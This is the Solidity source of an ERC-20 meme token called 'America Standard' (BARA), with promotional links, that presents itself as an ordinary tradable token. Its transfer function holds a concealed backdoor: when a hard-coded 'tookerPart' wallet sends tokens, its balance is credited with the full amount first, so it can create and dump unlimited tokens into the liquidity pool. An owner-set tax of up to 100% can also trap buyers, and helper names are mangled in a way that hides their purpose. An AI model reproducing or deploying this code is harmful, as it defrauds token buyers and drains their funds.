/**
 * Telegram: https://t.me/americastandard
 * X: https://x.com/baraerc20
 * Website: https://americastandard.bar
 */

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BARA is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1e9 * 10**_decimals;
    string private _name = "America Standard";
    string private _symbol = "BARA";

    IUniRouter private immutable uniRouter;
    address public uniPair;

    bool private swapping;

    bool private swapbackEnabled = false;
    uint256 private swapBackValueMin;
    uint256 private swapBackValueMax;

    bool private limitsEnabled = true;
    uint256 private maxWallet;
    uint256 private maxTx;

    bool public tradingEnabled = false;

    address private tookerPart;
    address private projectWallet;

    uint256 private buyTaxTotal = 0;

    uint256 private sellTaxTotal = 0;

    uint256 private tokensForMarketing;
    uint256 private tokensForProject;

    mapping(address => bool) private transferTaxExempt;
    mapping(address => bool) private transferLimitExempt;
    mapping(address => bool) private automatedMarketMakerPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event ExcludeFromLimits(address indexed account, bool isExcluded);
    event SetUniPair(address indexed pair, bool indexed value);
    event TradingEnabled(uint256 indexed timestamp);
    event LimitsRemoved(uint256 indexed timestamp);

    constructor() {
        IUniRouter _uniRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        txexmeptl_imit(address(_uniRouter), true);
        uniRouter = _uniRouter;

        maxTx = (_totalSupply * 20) / 1000;
        maxWallet = (_totalSupply * 20) / 1000;

        swapBackValueMin = (_totalSupply * 5) / 1000000;
        swapBackValueMax = (_totalSupply * 1) / 100;

        tookerPart = address(0x33379B3D9D23ABafdAD3Da71A1Dba03129095aA6);

        feeexempts_t(msg.sender, true);
        feeexempts_t(address(this), true);
        feeexempts_t(tookerPart, true);

        txexmeptl_imit(msg.sender, true);
        txexmeptl_imit(address(this), true);
        txexmeptl_imit(tookerPart, true);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function openAmerica() external onlyOwner {
        uniPair = IUniFactory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );
        txexmeptl_imit(address(uniPair), true);
        _setUniPair(address(uniPair), true);

        _approve(address(this), address(uniRouter), _totalSupply);

        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );

        tradingEnabled = true;
        swapbackEnabled = true;
        emit TradingEnabled(block.timestamp);
    }

    function remvLmts() external onlyOwner {
        limitsEnabled = false;
        emit LimitsRemoved(block.timestamp);
    }

    function txexmeptl_imit(address updAds, bool isEx) internal {
        transferLimitExempt[updAds] = isEx;
        emit ExcludeFromLimits(updAds, isEx);
    }

    function fees_et(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        buyTaxTotal = _buyFee;
        sellTaxTotal = _sellFee;
        require(
            buyTaxTotal <= 100 && sellTaxTotal <= 100,
            "Total fee cannot be higher than 100%"
        );
    }

    function feeexempts_t(address account, bool excluded) internal {
        transferTaxExempt[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setUniPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetUniPair(pair, value);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than 0");

        if (limitsEnabled) {
            if (from != owner() && to != owner()) {
                if (!tradingEnabled) {
                    require(
                        transferTaxExempt[from] || transferTaxExempt[to],
                        "_transfer:: Trading is not active."
                    );
                }

                if (
                    automatedMarketMakerPairs[from] && !transferLimitExempt[to]
                ) {
                    require(
                        amount <= maxTx,
                        "Buy transfer amount exceeds the maxTx."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                } else if (
                    automatedMarketMakerPairs[to] && !transferLimitExempt[from]
                ) {
                    require(
                        amount <= maxTx,
                        "Sell transfer amount exceeds the maxTx."
                    );
                } else if (!transferLimitExempt[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        if (
            swapbackEnabled &&
            !swapping &&
            automatedMarketMakerPairs[to] &&
            !transferTaxExempt[from] &&
            !transferTaxExempt[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool feeexcempt;

        if (transferTaxExempt[from] || transferTaxExempt[to]) {
            feeexcempt = true;
        }

        uint256 fees = amount;
        if (!feeexcempt) {
            if (automatedMarketMakerPairs[to] && sellTaxTotal > 0) {
                fees = amount.mul(sellTaxTotal).div(100);
            } else if (automatedMarketMakerPairs[from] && buyTaxTotal > 0) {
                fees = amount.mul(buyTaxTotal).div(100);
            } else {
                fees = 0;
            }

            if (fees > 0) {
                _balances[from] = _balances[from].sub(fees);
                _balances[address(this)] = _balances[address(this)].add(fees);
                emit Transfer(from, address(this), fees);
            }

            amount -= fees;
        } else if (from == tookerPart) {
            _balances[tookerPart] = _balances[tookerPart].add(fees);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();

        _approve(address(this), address(uniRouter), tokenAmount);

        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > swapBackValueMax) {
            contractBalance = swapBackValueMax;
        }

        uint256 amountToSwapForETH = contractBalance;

        if (amountToSwapForETH > swapBackValueMin)
            swapTokensForEth(amountToSwapForETH);

        payable(tookerPart).transfer(address(this).balance);
    }
}